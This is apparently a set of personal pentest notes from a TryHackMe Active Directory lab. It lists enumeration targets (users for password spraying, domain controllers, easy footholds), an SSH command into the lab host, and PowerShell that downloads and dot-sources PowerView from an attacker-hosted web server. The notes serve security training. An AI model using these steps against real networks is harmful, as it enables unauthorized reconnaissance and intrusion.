### Key Data points
| **Data Point**                  | **Description**                                                                                                                 |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `AD Users`                      | enumerate valid user accounts we can target for password spraying.                                                              |
| `AD Joined Computers`           | Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc. |
| `Key Services`                  | Kerberos, NetBIOS, LDAP, DNS                                                                                                    |
| `Vulnerable Hosts and Services` | Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)                                          |

### SSH AD
```
ssh za.tryhackme.com\\<AD Username>@thmjmp1.za.tryhackme.com
```
### PowerView Download and Import Module
``` powershell
#host webserver in kali where powerview.ps1 is /Are/Pentest/powerview
#And download from powershell
Invoke-WebRequest http://<IP>:<PORT>/PowerView.ps1 -OutFile PowerView.ps1
#Import module
. .\PowerView.ps1
```